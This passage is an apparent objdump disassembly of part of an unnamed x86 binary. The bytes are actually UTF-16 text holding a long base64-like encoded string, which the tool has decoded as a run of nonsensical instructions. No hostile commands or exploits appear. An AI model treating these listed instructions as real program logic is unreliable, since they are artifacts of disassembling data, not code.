  409eb5:	6d                   	insl   (%dx),%es:(%edi)
  409eb6:	00 48 00             	add    %cl,0x0(%eax)
  409eb9:	7a 00                	jp     0x409ebb
  409ebb:	52                   	push   %edx
  409ebc:	00 76 00             	add    %dh,0x0(%esi)
  409ebf:	34 00                	xor    $0x0,%al
  409ec1:	4f                   	dec    %edi
  409ec2:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  409ec6:	00 76 00             	add    %dh,0x0(%esi)
  409ec9:	32 00                	xor    (%eax),%al
  409ecb:	62 00                	bound  %eax,(%eax)
  409ecd:	61                   	popa
  409ece:	00 39                	add    %bh,(%ecx)
  409ed0:	00 67 00             	add    %ah,0x0(%edi)
  409ed3:	75 00                	jne    0x409ed5
  409ed5:	49                   	dec    %ecx
  409ed6:	00 36                	add    %dh,(%esi)
  409ed8:	00 36                	add    %dh,(%esi)
  409eda:	00 70 00             	add    %dh,0x0(%eax)
  409edd:	37                   	aaa
  409ede:	00 52 00             	add    %dl,0x0(%edx)
  409ee1:	76 00                	jbe    0x409ee3
  409ee3:	2f                   	das
  409ee4:	00 71 00             	add    %dh,0x0(%ecx)
  409ee7:	75 00                	jne    0x409ee9
  409ee9:	39 00                	cmp    %eax,(%eax)
  409eeb:	45                   	inc    %ebp
  409eec:	00 67 00             	add    %ah,0x0(%edi)
  409eef:	2b 00                	sub    (%eax),%eax
  409ef1:	35 00 4d 00 6c       	xor    $0x6c004d00,%eax
  409ef6:	00 35 00 72 00 6c    	add    %dh,0x6c007200
  409efc:	00 72 00             	add    %dh,0x0(%edx)
  409eff:	48                   	dec    %eax
  409f00:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  409f04:	00 4a 00             	add    %cl,0x0(%edx)
  409f07:	37                   	aaa
  409f08:	00 69 00             	add    %ch,0x0(%ecx)
  409f0b:	46                   	inc    %esi
  409f0c:	00 78 00             	add    %bh,0x0(%eax)
  409f0f:	66 00 4c 00 63       	data16 add %cl,0x63(%eax,%eax,1)
  409f14:	00 52 00             	add    %dl,0x0(%edx)
  409f17:	52                   	push   %edx
  409f18:	00 61 00             	add    %ah,0x0(%ecx)
  409f1b:	61                   	popa
  409f1c:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f1f:	53                   	push   %ebx
  409f20:	00 41 00             	add    %al,0x0(%ecx)
  409f23:	33 00                	xor    (%eax),%eax
  409f25:	34 00                	xor    $0x0,%al
  409f27:	41                   	inc    %ecx
  409f28:	00 65 00             	add    %ah,0x0(%ebp)
  409f2b:	39 00                	cmp    %eax,(%eax)
  409f2d:	6c                   	insb   (%dx),%es:(%edi)
  409f2e:	00 52 00             	add    %dl,0x0(%edx)
  409f31:	75 00                	jne    0x409f33
  409f33:	5a                   	pop    %edx
  409f34:	00 76 00             	add    %dh,0x0(%esi)
  409f37:	68 00 32 00 37       	push   $0x37003200
  409f3c:	00 73 00             	add    %dh,0x0(%ebx)
  409f3f:	78 00                	js     0x409f41
  409f41:	74 00                	je     0x409f43
  409f43:	57                   	push   %edi
  409f44:	00 43 00             	add    %al,0x0(%ebx)
  409f47:	57                   	push   %edi
  409f48:	00 79 00             	add    %bh,0x0(%ecx)
  409f4b:	75 00                	jne    0x409f4d
  409f4d:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  409f51:	59                   	pop    %ecx
  409f52:	00 52 00             	add    %dl,0x0(%edx)
  409f55:	35 00 64 00 43       	xor    $0x43006400,%eax
  409f5a:	00 42 00             	add    %al,0x0(%edx)
  409f5d:	54                   	push   %esp
  409f5e:	00 61 00             	add    %ah,0x0(%ecx)
  409f61:	4f                   	dec    %edi
  409f62:	00 4d 00             	add    %cl,0x0(%ebp)
  409f65:	79 00                	jns    0x409f67
  409f67:	37                   	aaa
  409f68:	00 38                	add    %bh,(%eax)
  409f6a:	00 4b 00             	add    %cl,0x0(%ebx)
  409f6d:	38 00                	cmp    %al,(%eax)
  409f6f:	6f                   	outsl  %ds:(%esi),(%dx)
  409f70:	00 38                	add    %bh,(%eax)
  409f72:	00 39                	add    %bh,(%ecx)
  409f74:	00 30                	add    %dh,(%eax)
  409f76:	00 76 00             	add    %dh,0x0(%esi)
  409f79:	34 00                	xor    $0x0,%al
  409f7b:	6b 00 75             	imul   $0x75,(%eax),%eax
  409f7e:	00 77 00             	add    %dh,0x0(%edi)
  409f81:	41                   	inc    %ecx
  409f82:	00 4a 00             	add    %cl,0x0(%edx)
  409f85:	58                   	pop    %eax
  409f86:	00 78 00             	add    %bh,0x0(%eax)
  409f89:	4c                   	dec    %esp
  409f8a:	00 31                	add    %dh,(%ecx)
  409f8c:	00 71 00             	add    %dh,0x0(%ecx)
  409f8f:	69 00 30 00 62 00    	imul   $0x620030,(%eax),%eax
  409f95:	75 00                	jne    0x409f97
  409f97:	34 00                	xor    $0x0,%al
  409f99:	6e                   	outsb  %ds:(%esi),(%dx)
  409f9a:	00 69 00             	add    %ch,0x0(%ecx)
  409f9d:	34 00                	xor    $0x0,%al
  409f9f:	72 00                	jb     0x409fa1
  409fa1:	48                   	dec    %eax
  409fa2:	00 4f 00             	add    %cl,0x0(%edi)
  409fa5:	62 00                	bound  %eax,(%eax)
  409fa7:	4f                   	dec    %edi
  409fa8:	00 72 00             	add    %dh,0x0(%edx)
  409fab:	39 00                	cmp    %eax,(%eax)
  409fad:	57                   	push   %edi
  409fae:	00 33                	add    %dh,(%ebx)
  409fb0:	00 6a 00             	add    %ch,0x0(%edx)
  409fb3:	50                   	push   %eax
  409fb4:	00 4a 00             	add    %cl,0x0(%edx)
  409fb7:	66 00 44 00 69       	data16 add %al,0x69(%eax,%eax,1)
  409fbc:	00 4e 00             	add    %cl,0x0(%esi)
  409fbf:	45                   	inc    %ebp
  409fc0:	00 47 00             	add    %al,0x0(%edi)
  409fc3:	59                   	pop    %ecx
  409fc4:	00 51 00             	add    %dl,0x0(%ecx)
  409fc7:	59                   	pop    %ecx
  409fc8:	00 33                	add    %dh,(%ebx)
  409fca:	00 70 00             	add    %dh,0x0(%eax)
  409fcd:	4d                   	dec    %ebp
  409fce:	00 67 00             	add    %ah,0x0(%edi)
  409fd1:	33 00                	xor    (%eax),%eax
  409fd3:	6e                   	outsb  %ds:(%esi),(%dx)
  409fd4:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  409fd8:	00 50 00             	add    %dl,0x0(%eax)
  409fdb:	6d                   	insl   (%dx),%es:(%edi)
  409fdc:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  409fe0:	00 58 00             	add    %bl,0x0(%eax)
  409fe3:	76 00                	jbe    0x409fe5
  409fe5:	72 00                	jb     0x409fe7
  409fe7:	61                   	popa
  409fe8:	00 4f 00             	add    %cl,0x0(%edi)
  409feb:	59                   	pop    %ecx
  409fec:	00 56 00             	add    %dl,0x0(%esi)
  409fef:	6f                   	outsl  %ds:(%esi),(%dx)
  409ff0:	00 69 00             	add    %ch,0x0(%ecx)
  409ff3:	7a 00                	jp     0x409ff5
  409ff5:	4c                   	dec    %esp
  409ff6:	00 48 00             	add    %cl,0x0(%eax)
  409ff9:	4a                   	dec    %edx
  409ffa:	00 59 00             	add    %bl,0x0(%ecx)
  409ffd:	41                   	inc    %ecx
  409ffe:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40a002:	00 45 00             	add    %al,0x0(%ebp)
  40a005:	67 00 4c 00          	add    %cl,0x0(%si)
  40a009:	38 00                	cmp    %al,(%eax)
  40a00b:	62 00                	bound  %eax,(%eax)
  40a00d:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40a011:	6a 00                	push   $0x0
  40a013:	31 00                	xor    %eax,(%eax)
  40a015:	76 00                	jbe    0x40a017
  40a017:	2b 00                	sub    (%eax),%eax
  40a019:	4b                   	dec    %ebx
  40a01a:	00 75 00             	add    %dh,0x0(%ebp)
  40a01d:	6a 00                	push   $0x0
  40a01f:	74 00                	je     0x40a021
  40a021:	76 00                	jbe    0x40a023
  40a023:	72 00                	jb     0x40a025
  40a025:	71 00                	jno    0x40a027
  40a027:	5a                   	pop    %edx
  40a028:	00 76 00             	add    %dh,0x0(%esi)
  40a02b:	33 00                	xor    (%eax),%eax
  40a02d:	4b                   	dec    %ebx
  40a02e:	00 4f 00             	add    %cl,0x0(%edi)
  40a031:	4d                   	dec    %ebp
  40a032:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40a036:	00 61 00             	add    %ah,0x0(%ecx)
  40a039:	48                   	dec    %eax
  40a03a:	00 33                	add    %dh,(%ebx)
  40a03c:	00 39                	add    %bh,(%ecx)
  40a03e:	00 30                	add    %dh,(%eax)
  40a040:	00 6a 00             	add    %ch,0x0(%edx)
  40a043:	76 00                	jbe    0x40a045
  40a045:	6f                   	outsl  %ds:(%esi),(%dx)
  40a046:	00 71 00             	add    %dh,0x0(%ecx)
  40a049:	46                   	inc    %esi
  40a04a:	00 78 00             	add    %bh,0x0(%eax)
  40a04d:	54                   	push   %esp
  40a04e:	00 77 00             	add    %dh,0x0(%edi)
  40a051:	79 00                	jns    0x40a053
  40a053:	44                   	inc    %esp
  40a054:	00 61 00             	add    %ah,0x0(%ecx)
  40a057:	62 00                	bound  %eax,(%eax)
  40a059:	6e                   	outsb  %ds:(%esi),(%dx)
  40a05a:	00 37                	add    %dh,(%edi)
  40a05c:	00 56 00             	add    %dl,0x0(%esi)
  40a05f:	46                   	inc    %esi
  40a060:	00 2f                	add    %ch,(%edi)
  40a062:	00 79 00             	add    %bh,0x0(%ecx)
  40a065:	75 00                	jne    0x40a067
  40a067:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40a06a:	00 71 00             	add    %dh,0x0(%ecx)
  40a06d:	35 00 70 00 36       	xor    $0x36007000,%eax
  40a072:	00 45 00             	add    %al,0x0(%ebp)
  40a075:	51                   	push   %ecx
  40a076:	00 52 00             	add    %dl,0x0(%edx)
  40a079:	51                   	push   %ecx
  40a07a:	00 4d 00             	add    %cl,0x0(%ebp)
  40a07d:	47                   	inc    %edi
  40a07e:	00 5a 00             	add    %bl,0x0(%edx)
  40a081:	6a 00                	push   $0x0
  40a083:	49                   	dec    %ecx
  40a084:	00 70 00             	add    %dh,0x0(%eax)
  40a087:	43                   	inc    %ebx
  40a088:	00 6b 00             	add    %ch,0x0(%ebx)
  40a08b:	2b 00                	sub    (%eax),%eax
  40a08d:	58                   	pop    %eax
  40a08e:	00 71 00             	add    %dh,0x0(%ecx)
  40a091:	33 00                	xor    (%eax),%eax
  40a093:	35 00 6a 00 78       	xor    $0x78006a00,%eax
  40a098:	00 63 00             	add    %ah,0x0(%ebx)
  40a09b:	4e                   	dec    %esi
  40a09c:	00 66 00             	add    %ah,0x0(%esi)
  40a09f:	72 00                	jb     0x40a0a1
  40a0a1:	4a                   	dec    %edx
  40a0a2:	00 39                	add    %bh,(%ecx)
  40a0a4:	00 75 00             	add    %dh,0x0(%ebp)
  40a0a7:	46                   	inc    %esi
  40a0a8:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0ab:	57                   	push   %edi
  40a0ac:	00 63 00             	add    %ah,0x0(%ebx)
  40a0af:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0b0:	00 39                	add    %bh,(%ecx)
  40a0b2:	00 48 00             	add    %cl,0x0(%eax)
  40a0b5:	61                   	popa
  40a0b6:	00 59 00             	add    %bl,0x0(%ecx)
  40a0b9:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40a0bd:	49                   	dec    %ecx
  40a0be:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0c1:	78 00                	js     0x40a0c3
  40a0c3:	50                   	push   %eax
  40a0c4:	00 37                	add    %dh,(%edi)
  40a0c6:	00 4e 00             	add    %cl,0x0(%esi)
  40a0c9:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0ca:	00 38                	add    %bh,(%eax)
  40a0cc:	00 5a 00             	add    %bl,0x0(%edx)
  40a0cf:	68 00 37 00 6d       	push   $0x6d003700
  40a0d4:	00 6a 00             	add    %ch,0x0(%edx)
  40a0d7:	5a                   	pop    %edx
  40a0d8:	00 56 00             	add    %dl,0x0(%esi)
  40a0db:	2f                   	das
  40a0dc:	00 2f                	add    %ch,(%edi)
  40a0de:	00 56 00             	add    %dl,0x0(%esi)
  40a0e1:	5a                   	pop    %edx
  40a0e2:	00 72 00             	add    %dh,0x0(%edx)
  40a0e5:	74 00                	je     0x40a0e7
  40a0e7:	43                   	inc    %ebx
  40a0e8:	00 46 00             	add    %al,0x0(%esi)
  40a0eb:	6a 00                	push   $0x0
  40a0ed:	76 00                	jbe    0x40a0ef
  40a0ef:	44                   	inc    %esp
  40a0f0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0f3:	32 00                	xor    (%eax),%al
  40a0f5:	47                   	inc    %edi
  40a0f6:	00 59 00             	add    %bl,0x0(%ecx)
  40a0f9:	35 00 76 00 30       	xor    $0x30007600,%eax
  40a0fe:	00 51 00             	add    %dl,0x0(%ecx)
  40a101:	75 00                	jne    0x40a103
  40a103:	53                   	push   %ebx
  40a104:	00 4e 00             	add    %cl,0x0(%esi)
  40a107:	66 00 2f             	data16 add %ch,(%edi)
  40a10a:	00 61 00             	add    %ah,0x0(%ecx)
  40a10d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a10e:	00 6d 00             	add    %ch,0x0(%ebp)
  40a111:	6e                   	outsb  %ds:(%esi),(%dx)
  40a112:	00 73 00             	add    %dh,0x0(%ebx)
  40a115:	68 00 46 00 77       	push   $0x77004600
  40a11a:	00 37                	add    %dh,(%edi)
  40a11c:	00 72 00             	add    %dh,0x0(%edx)
  40a11f:	6d                   	insl   (%dx),%es:(%edi)
  40a120:	00 73 00             	add    %dh,0x0(%ebx)
  40a123:	72 00                	jb     0x40a125
  40a125:	78 00                	js     0x40a127
  40a127:	51                   	push   %ecx
  40a128:	00 56 00             	add    %dl,0x0(%esi)
  40a12b:	4e                   	dec    %esi
  40a12c:	00 5a 00             	add    %bl,0x0(%edx)
  40a12f:	37                   	aaa
  40a130:	00 56 00             	add    %dl,0x0(%esi)
  40a133:	79 00                	jns    0x40a135
  40a135:	69 00 38 00 57 00    	imul   $0x570038,(%eax),%eax
  40a13b:	50                   	push   %eax
  40a13c:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  40a140:	00 31                	add    %dh,(%ecx)
  40a142:	00 63 00             	add    %ah,0x0(%ebx)
  40a145:	68 00 79 00 58       	push   $0x58007900
  40a14a:	00 57 00             	add    %dl,0x0(%edi)
  40a14d:	68 00 75 00 7a       	push   $0x7a007500
  40a152:	00 72 00             	add    %dh,0x0(%edx)
  40a155:	33 00                	xor    (%eax),%eax
  40a157:	42                   	inc    %edx
  40a158:	00 51 00             	add    %dl,0x0(%ecx)
  40a15b:	50                   	push   %eax
  40a15c:	00 35 00 59 00 66    	add    %dh,0x66005900
  40a162:	00 49 00             	add    %cl,0x0(%ecx)
  40a165:	2f                   	das
  40a166:	00 71 00             	add    %dh,0x0(%ecx)
  40a169:	42                   	inc    %edx
  40a16a:	00 58 00             	add    %bl,0x0(%eax)
  40a16d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a16e:	00 4a 00             	add    %cl,0x0(%edx)
  40a171:	69 00 4c 00 7a 00    	imul   $0x7a004c,(%eax),%eax
  40a177:	61                   	popa
  40a178:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40a17c:	00 73 00             	add    %dh,0x0(%ebx)
  40a17f:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40a183:	4e                   	dec    %esi
  40a184:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a188:	00 50 00             	add    %dl,0x0(%eax)
  40a18b:	6c                   	insb   (%dx),%es:(%edi)
  40a18c:	00 79 00             	add    %bh,0x0(%ecx)
  40a18f:	33 00                	xor    (%eax),%eax
  40a191:	44                   	inc    %esp
  40a192:	00 77 00             	add    %dh,0x0(%edi)
  40a195:	6c                   	insb   (%dx),%es:(%edi)
  40a196:	00 48 00             	add    %cl,0x0(%eax)
  40a199:	76 00                	jbe    0x40a19b
  40a19b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a19c:	00 50 00             	add    %dl,0x0(%eax)
  40a19f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a0:	00 6f 00             	add    %ch,0x0(%edi)
  40a1a3:	69 00 50 00 4b 00    	imul   $0x4b0050,(%eax),%eax
  40a1a9:	57                   	push   %edi
  40a1aa:	00 32                	add    %dh,(%edx)
  40a1ac:	00 36                	add    %dh,(%esi)
  40a1ae:	00 38                	add    %bh,(%eax)
  40a1b0:	00 43 00             	add    %al,0x0(%ebx)
  40a1b3:	2b 00                	sub    (%eax),%eax
  40a1b5:	71 00                	jno    0x40a1b7
  40a1b7:	45                   	inc    %ebp
  40a1b8:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40a1bc:	00 45 00             	add    %al,0x0(%ebp)
  40a1bf:	43                   	inc    %ebx
  40a1c0:	00 6f 00             	add    %ch,0x0(%edi)
  40a1c3:	37                   	aaa
  40a1c4:	00 37                	add    %dh,(%edi)
  40a1c6:	00 70 00             	add    %dh,0x0(%eax)
  40a1c9:	4b                   	dec    %ebx
  40a1ca:	00 57 00             	add    %dl,0x0(%edi)
  40a1cd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1ce:	00 78 00             	add    %bh,0x0(%eax)
  40a1d1:	4d                   	dec    %ebp
  40a1d2:	00 73 00             	add    %dh,0x0(%ebx)
  40a1d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1d6:	00 32                	add    %dh,(%edx)
  40a1d8:	00 68 00             	add    %ch,0x0(%eax)
  40a1db:	75 00                	jne    0x40a1dd
  40a1dd:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40a1e1:	51                   	push   %ecx
  40a1e2:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40a1e6:	00 59 00             	add    %bl,0x0(%ecx)
  40a1e9:	41                   	inc    %ecx
  40a1ea:	00 6b 00             	add    %ch,0x0(%ebx)
  40a1ed:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a1f0:	00 39                	add    %bh,(%ecx)
  40a1f2:	00 45 00             	add    %al,0x0(%ebp)
  40a1f5:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40a1f9:	53                   	push   %ebx
  40a1fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1fd:	53                   	push   %ebx
  40a1fe:	00 71 00             	add    %dh,0x0(%ecx)
  40a201:	30 00                	xor    %al,(%eax)
  40a203:	56                   	push   %esi
  40a204:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40a208:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a20b:	59                   	pop    %ecx
  40a20c:	00 66 00             	add    %ah,0x0(%esi)
  40a20f:	66 00 36             	data16 add %dh,(%esi)
  40a212:	00 49 00             	add    %cl,0x0(%ecx)
  40a215:	6e                   	outsb  %ds:(%esi),(%dx)
  40a216:	00 59 00             	add    %bl,0x0(%ecx)
  40a219:	68 00 36 00 43       	push   $0x43003600
  40a21e:	00 65 00             	add    %ah,0x0(%ebp)
  40a221:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40a225:	75 00                	jne    0x40a227
  40a227:	37                   	aaa
  40a228:	00 65 00             	add    %ah,0x0(%ebp)
  40a22b:	51                   	push   %ecx
  40a22c:	00 2b                	add    %ch,(%ebx)
  40a22e:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40a232:	00 61 00             	add    %ah,0x0(%ecx)
  40a235:	45                   	inc    %ebp
  40a236:	00 55 00             	add    %dl,0x0(%ebp)
  40a239:	6c                   	insb   (%dx),%es:(%edi)
  40a23a:	00 6b 00             	add    %ch,0x0(%ebx)
  40a23d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a23e:	00 61 00             	add    %ah,0x0(%ecx)
  40a241:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40a245:	72 00                	jb     0x40a247
  40a247:	63 00                	arpl   %eax,(%eax)
  40a249:	51                   	push   %ecx
  40a24a:	00 65 00             	add    %ah,0x0(%ebp)
  40a24d:	76 00                	jbe    0x40a24f
  40a24f:	71 00                	jno    0x40a251
  40a251:	37                   	aaa
  40a252:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  40a256:	00 4a 00             	add    %cl,0x0(%edx)
  40a259:	4f                   	dec    %edi
  40a25a:	00 7a 00             	add    %bh,0x0(%edx)
  40a25d:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a260:	00 36                	add    %dh,(%esi)
  40a262:	00 62 00             	add    %ah,0x0(%edx)
  40a265:	78 00                	js     0x40a267
  40a267:	65 00 36             	add    %dh,%gs:(%esi)
  40a26a:	00 69 00             	add    %ch,0x0(%ecx)
  40a26d:	4d                   	dec    %ebp
  40a26e:	00 2f                	add    %ch,(%edi)
  40a270:	00 72 00             	add    %dh,0x0(%edx)
  40a273:	71 00                	jno    0x40a275
  40a275:	54                   	push   %esp
  40a276:	00 7a 00             	add    %bh,0x0(%edx)
  40a279:	74 00                	je     0x40a27b
  40a27b:	61                   	popa
  40a27c:	00 30                	add    %dh,(%eax)
  40a27e:	00 32                	add    %dh,(%edx)
  40a280:	00 52 00             	add    %dl,0x0(%edx)
  40a283:	43                   	inc    %ebx
  40a284:	00 30                	add    %dh,(%eax)
  40a286:	00 33                	add    %dh,(%ebx)
  40a288:	00 7a 00             	add    %bh,0x0(%edx)
  40a28b:	53                   	push   %ebx
  40a28c:	00 42 00             	add    %al,0x0(%edx)
  40a28f:	41                   	inc    %ecx
  40a290:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a293:	6e                   	outsb  %ds:(%esi),(%dx)
  40a294:	00 36                	add    %dh,(%esi)
  40a296:	00 6e 00             	add    %ch,0x0(%esi)
  40a299:	6c                   	insb   (%dx),%es:(%edi)
  40a29a:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40a29e:	00 33                	add    %dh,(%ebx)
  40a2a0:	00 37                	add    %dh,(%edi)
  40a2a2:	00 5a 00             	add    %bl,0x0(%edx)
  40a2a5:	78 00                	js     0x40a2a7
  40a2a7:	75 00                	jne    0x40a2a9
  40a2a9:	45                   	inc    %ebp
  40a2aa:	00 73 00             	add    %dh,0x0(%ebx)
  40a2ad:	6a 00                	push   $0x0
  40a2af:	5a                   	pop    %edx
  40a2b0:	00 58 00             	add    %bl,0x0(%eax)
  40a2b3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2b4:	00 50 00             	add    %dl,0x0(%eax)
  40a2b7:	54                   	push   %esp
  40a2b8:	00 5a 00             	add    %bl,0x0(%edx)
  40a2bb:	63 00                	arpl   %eax,(%eax)
  40a2bd:	45                   	inc    %ebp
  40a2be:	00 43 00             	add    %al,0x0(%ebx)
  40a2c1:	75 00                	jne    0x40a2c3
  40a2c3:	31 00                	xor    %eax,(%eax)
  40a2c5:	4d                   	dec    %ebp
  40a2c6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2c9:	55                   	push   %ebp
  40a2ca:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a2ce:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40a2d2:	00 79 00             	add    %bh,0x0(%ecx)
  40a2d5:	4c                   	dec    %esp
  40a2d6:	00 77 00             	add    %dh,0x0(%edi)
  40a2d9:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2da:	00 78 00             	add    %bh,0x0(%eax)
  40a2dd:	59                   	pop    %ecx
  40a2de:	00 61 00             	add    %ah,0x0(%ecx)
  40a2e1:	6a 00                	push   $0x0
  40a2e3:	43                   	inc    %ebx
  40a2e4:	00 57 00             	add    %dl,0x0(%edi)
  40a2e7:	52                   	push   %edx
  40a2e8:	00 58 00             	add    %bl,0x0(%eax)
  40a2eb:	47                   	inc    %edi
  40a2ec:	00 72 00             	add    %dh,0x0(%edx)
  40a2ef:	38 00                	cmp    %al,(%eax)
  40a2f1:	52                   	push   %edx
  40a2f2:	00 6a 00             	add    %ch,0x0(%edx)
  40a2f5:	77 00                	ja     0x40a2f7
  40a2f7:	30 00                	xor    %al,(%eax)
  40a2f9:	46                   	inc    %esi
  40a2fa:	00 4a 00             	add    %cl,0x0(%edx)
  40a2fd:	6d                   	insl   (%dx),%es:(%edi)
  40a2fe:	00 45 00             	add    %al,0x0(%ebp)
  40a301:	4c                   	dec    %esp
  40a302:	00 75 00             	add    %dh,0x0(%ebp)
  40a305:	41                   	inc    %ecx
  40a306:	00 36                	add    %dh,(%esi)
  40a308:	00 65 00             	add    %ah,0x0(%ebp)
  40a30b:	72 00                	jb     0x40a30d
  40a30d:	4a                   	dec    %edx
  40a30e:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  40a312:	00 4a 00             	add    %cl,0x0(%edx)
  40a315:	30 00                	xor    %al,(%eax)
  40a317:	47                   	inc    %edi
  40a318:	00 6f 00             	add    %ch,0x0(%edi)
  40a31b:	4c                   	dec    %esp
  40a31c:	00 6b 00             	add    %ch,0x0(%ebx)
  40a31f:	4d                   	dec    %ebp
  40a320:	00 5a 00             	add    %bl,0x0(%edx)
  40a323:	2b 00                	sub    (%eax),%eax
  40a325:	43                   	inc    %ebx
  40a326:	00 48 00             	add    %cl,0x0(%eax)
  40a329:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40a32d:	6d                   	insl   (%dx),%es:(%edi)
  40a32e:	00 4a 00             	add    %cl,0x0(%edx)
  40a331:	4b                   	dec    %ebx
  40a332:	00 51 00             	add    %dl,0x0(%ecx)
  40a335:	41                   	inc    %ecx
  40a336:	00 2b                	add    %ch,(%ebx)
  40a338:	00 67 00             	add    %ah,0x0(%edi)
  40a33b:	62 00                	bound  %eax,(%eax)
  40a33d:	6b 00 54             	imul   $0x54,(%eax),%eax
  40a340:	00 46 00             	add    %al,0x0(%esi)
  40a343:	59                   	pop    %ecx
  40a344:	00 63 00             	add    %ah,0x0(%ebx)
  40a347:	5a                   	pop    %edx
  40a348:	00 63 00             	add    %ah,0x0(%ebx)
  40a34b:	77 00                	ja     0x40a34d
  40a34d:	61                   	popa
  40a34e:	00 53 00             	add    %dl,0x0(%ebx)
  40a351:	31 00                	xor    %eax,(%eax)
  40a353:	31 00                	xor    %eax,(%eax)
  40a355:	75 00                	jne    0x40a357
  40a357:	6d                   	insl   (%dx),%es:(%edi)
  40a358:	00 6f 00             	add    %ch,0x0(%edi)
  40a35b:	33 00                	xor    (%eax),%eax
  40a35d:	59                   	pop    %ecx
  40a35e:	00 47 00             	add    %al,0x0(%edi)
  40a361:	79 00                	jns    0x40a363
  40a363:	59                   	pop    %ecx
  40a364:	00 4b 00             	add    %cl,0x0(%ebx)
  40a367:	31 00                	xor    %eax,(%eax)
  40a369:	4a                   	dec    %edx
  40a36a:	00 6d 00             	add    %ch,0x0(%ebp)
  40a36d:	6d                   	insl   (%dx),%es:(%edi)
  40a36e:	00 46 00             	add    %al,0x0(%esi)
  40a371:	45                   	inc    %ebp
  40a372:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40a376:	00 69 00             	add    %ch,0x0(%ecx)
  40a379:	30 00                	xor    %al,(%eax)
  40a37b:	78 00                	js     0x40a37d
  40a37d:	4d                   	dec    %ebp
  40a37e:	00 57 00             	add    %dl,0x0(%edi)
  40a381:	6c                   	insb   (%dx),%es:(%edi)
  40a382:	00 59 00             	add    %bl,0x0(%ecx)
  40a385:	31 00                	xor    %eax,(%eax)
  40a387:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40a38b:	34 00                	xor    $0x0,%al
  40a38d:	71 00                	jno    0x40a38f
  40a38f:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40a393:	77 00                	ja     0x40a395
  40a395:	44                   	inc    %esp
  40a396:	00 6e 00             	add    %ch,0x0(%esi)
  40a399:	49                   	dec    %ecx
  40a39a:	00 57 00             	add    %dl,0x0(%edi)
  40a39d:	69 00 78 00 31 00    	imul   $0x310078,(%eax),%eax
  40a3a3:	4c                   	dec    %esp
  40a3a4:	00 65 00             	add    %ah,0x0(%ebp)
  40a3a7:	39 00                	cmp    %eax,(%eax)
  40a3a9:	6b 00 67             	imul   $0x67,(%eax),%eax
  40a3ac:	00 39                	add    %bh,(%ecx)
  40a3ae:	00 50 00             	add    %dl,0x0(%eax)
  40a3b1:	77 00                	ja     0x40a3b3
  40a3b3:	42                   	inc    %edx
  40a3b4:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40a3b8:	00 46 00             	add    %al,0x0(%esi)
  40a3bb:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40a3bf:	35 00 6b 00 43       	xor    $0x43006b00,%eax
  40a3c4:	00 30                	add    %dh,(%eax)
  40a3c6:	00 65 00             	add    %ah,0x0(%ebp)
  40a3c9:	71 00                	jno    0x40a3cb
  40a3cb:	52                   	push   %edx
  40a3cc:	00 4e 00             	add    %cl,0x0(%esi)
  40a3cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3d0:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40a3d4:	00 43 00             	add    %al,0x0(%ebx)
  40a3d7:	48                   	dec    %eax
  40a3d8:	00 41 00             	add    %al,0x0(%ecx)
  40a3db:	34 00                	xor    $0x0,%al
  40a3dd:	57                   	push   %edi
  40a3de:	00 7a 00             	add    %bh,0x0(%edx)
  40a3e1:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40a3e5:	66 00 68 00          	data16 add %ch,0x0(%eax)
  40a3e9:	43                   	inc    %ebx
  40a3ea:	00 45 00             	add    %al,0x0(%ebp)
  40a3ed:	48                   	dec    %eax
